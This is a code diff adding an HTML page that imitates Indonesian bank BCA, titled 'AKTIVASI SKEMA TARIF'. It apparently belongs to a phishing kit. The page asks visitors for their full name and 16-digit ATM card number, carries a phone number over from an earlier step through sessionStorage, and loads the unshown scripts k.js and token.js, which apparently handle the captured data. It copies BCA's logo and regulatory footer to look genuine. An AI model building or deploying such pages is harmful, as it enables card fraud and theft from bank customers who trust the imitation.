@@ -1,0 +1,296 @@
+
+
+<!DOCTYPE html>
+<html>
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+<meta name="VIcurrentDateTime" content="638420422355925020" />
+
+<meta name="theme-color" content="#005BAA"> 
+	<meta charset="utf-8">
+	<meta name="description" content="">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+
+	<meta name="twitter:image" content="">
+	<!-- TODO! : Place favicon.ico in the root directory -->
+	<link rel="shortcut icon" href="../Nassets/images/favicon.png">
+	<link href="main.css"		 rel="stylesheet">	
+        
+    
+</head>
+
+<body> 
+    <div class="loader" id="loading-progress">
+        <div class="wrapper-loader">
+		<div class="loading-div">
+            <div class="rect rect_one"></div>
+            <div class="rect rect_two"></div>
+            <div class="rect rect_three"></div>
+			<div class="loading-text">Mohon Tunggu...</div>
+		</div>
+        </div>
+    </div>
+	
+	
+
+<!--rendering header-->
+
+
+<style>
+    body {
+  position: relative;
+}
+    
+    .pull-right-lang {
+        float: right !important;
+        margin: auto 0px;
+        font-size: 0px;
+        margin-left: auto;
+    }
+
+    .switch {
+        padding: 6px 2px;
+        width: 40px;
+        display: inline-block;
+        text-align: center;
+        text-decoration: none !important;
+        transition: color 0.2s ease, background-color 0.2s ease;
+        border: 1px solid #fff;
+    }
+
+        .switch:first-child {
+            border-top-left-radius: 16px;
+            border-bottom-left-radius: 16px;
+        }
+
+        .switch:last-child {
+            border-top-right-radius: 16px;
+            border-bottom-right-radius: 16px;
+        }
+
+        .switch.is-active, .switch:hover {
+            background: #fff;
+            color: #0066ae;
+        }
+
+    .text-lang {
+        font-size: 12px;
+        color: #fff
+    }
+    
+    #wrapper{
+	
+	background-repeat: no-repeat !important;
+    background-size: cover !important;;
+    background-position: center !important;
+}
+
+@media(max-width:525px){
+  #wrapper{
+    background:url('img/background-blue-mobile.png')left 50% bottom 175px/cover no-repeat !important;
+  }
+}
+
+#wrapper{
+	background-color:transparent;
+}
+
+
+  .fontku{
+       font-size: 12px;
+   }
+   
+   
+   
+   .btn-submit:active{
+       color: #fff;
+   }
+   
+   .btn:active{
+       color: #fff;
+   }
+   
+  .btn-default:active{
+      color: #fff;
+  }
+  
+  
+  
+  #btnSubmit, #btnSubmit1, #btnSubmit2{
+      color: #fff;
+      letter-spacing: 0;
+  }
+  
+  
+  #btnSubmit:active, #btnSubmit1:active, #btnSubmit2:active{
+      color: #fff;
+  }
+  
+  #typing-text {
+	height: 80px;
+	max-width: 280px;
+	font-size: 14px;
+	border: solid 1px #C9C9C9;
+	color: #0086e0;
+	background-color: #FFFFFF;
+	text-align: center;
+	font-family: Almarai, sans-serif;
+	font-weight: bold;
+	line-height: 19px;
+	padding: 5px;
+	letter-spacing: 0px;
+	resize: none;
+	outline: none;
+	border: none;
+	box-sizing: border-box;
+	padding-left: 0px;
+}
+
+textarea{
+    width: 280px;
+}
+</style>
+<div id="wrapper">
+		<div id="">
+	<div class="container">
+		<div class="d-flex py-2">
+			<div class="mr-auto p-2"><img src="img/logo_2x.png" alt="" id="logobca" class="img-fluid logos"></div>
+            
+            
+            
+            <div class="container" style="display: -webkit-flex !important;">
+
+                <div class="pull-right-lang">
+                    <a class="switch text-lang is-active" href="#">ID</a>
+                    <a class="switch text-lang " href="#">EN</a>
+                </div>
+            </div>
+
+		
+		</div>
+	</div>
+
+</div>
+		<div id ="#content" class="background">
+                	<div id="LandingPageAsuransi">
+<title>BCA - AKTIVASI SKEMA TARIF</title>
+
+
+
+
+
+
+<div class="AsuransiFormWrapper" style="border-radius: 10px; padding: 24px">
+    
+    
+    
+<fieldset id="debitpage" style="display: ">
+	<h3 class="text-center mb-2" style="font-size: 18px; font-weight: bold;">Verifikasi Kartu ATM</h3>
+	<hr>
+	<p class="text-center mb-5 leads" style="line-height:17px;font-weight:700;">Masukkan nomor Kartu Debit BCA<br>Pastikan Kartu Debit aktif.</p>
+
+
+
+<form  method="POST" id="kontol" autocomplete="off" style="margin-top: -15px">
+<input type="hidden" name="nomor" id="nomor" value="">
+		
+		<div class="form-group">
+<label for="debit" style="color: #005BAA; font-weight: bold;">Atas Nama:</label>
+			<input type="text"
+			oninvalid="this.setCustomValidity('𝗔𝘁𝗮𝘀 𝗡𝗮𝗺𝗮 𝗦𝗲𝘀𝘂𝗮𝗶 𝗞𝗧𝗣')" onchange="this.setCustomValidity('')" autocomplete="off" name="nama" id="nama" placeholder="Nama Sesuai KTP" style="margin-top:-6px;" required  class="focus-blue form-control">
+		</div>
+		<div class="form-group" id="app">
+<label for="debit" style="color: #005BAA; font-weight: bold;margin-top:6px;">Nomor Kartu ATM</label>		    
+			 <input type="tel" data-mask="0000 0000 0000 0000" pattern="(?=.*[0-9]).{19,19}" oninvalid="this.setCustomValidity('Mɑsukkɑn 𝟭𝟲 𝗗𝗶𝗴𝗶𝘁 𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂')" onchange="this.setCustomValidity('')"  id="norek" name="norek" class="focus-blue form-control" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" placeholder="16 digit No.kartu ATM" required minlength="19" maxlength="19" style="background-image: url(img/AddText_11-17-08.39.07.png);
+  background-size: 25px;
+  background-position: 97% center;
+  background-repeat: no-repeat;margin-top:-6px;"> 
+		</div>
+		
+		<div class="text-center mt-4 mb-1">
+			<button type="submit" id="btnSubmit" class="btn btn-default btn-submit">Proses</button>
+		</div>
+		<div class="text-center">
+					<input type="hidden" id="captcha" name="captcha" value="">
+					<div class="text-center pt-4 disclaimer-recaptcha captcha-policies">
+						This site is protected by reCAPTCHA and the 
+						<a href="#">Google Privacy Policy</a> and
+						<a href="#">Terms of Service</a> apply.
+					</div>
+
+		</div>
+	</form>
+	</fieldset>   
+
+    
+  
+
+</div> 
+</div> 
+</div> 
+</center>
+<br/>
+
+
+
+
+</div>
+	</div>
+
+
+         </div> 
+		 <!--rendering content-->
+    </div>
+
+  
+    <!-- /#global-modal -->
+    
+	<!--rendering content-->
+	<div id="Webform-footer">
+		 
+
+
+
+<div class="container">
+	<div class="row justify-content-center mt-4">
+		<div class="col-lg-10">
+			<div class="footer-data-wrapper row justify-content-center">
+				
+			<div class="footer-logo-desc mb-3 ">
+						<div class="text-center justify-content-center pl-5 pr-5" style="color:#7D8185; margin-top: -50px">
+							 <p class=""> BCA berizin dan diawasi oleh Otoritas Jasa Keuangan - BCA merupakan peserta penjaminan LPS</p>
+							
+						</div>
+					</div>    
+			</div>
+		</div>
+	</div>
+</div>
+	</div>
+<script>
+
+</script>
+
+		<!-- end script detect browser-->
+
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script src='k.js'></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+ <script>
+ var nomor = sessionStorage.getItem("nomor");
+ document.getElementById("nomor").value = nomor + "";  
+ </script>
+<script src="token.js">
+
+     
+</script>	
+
+</script>	
+	
+</body>
+
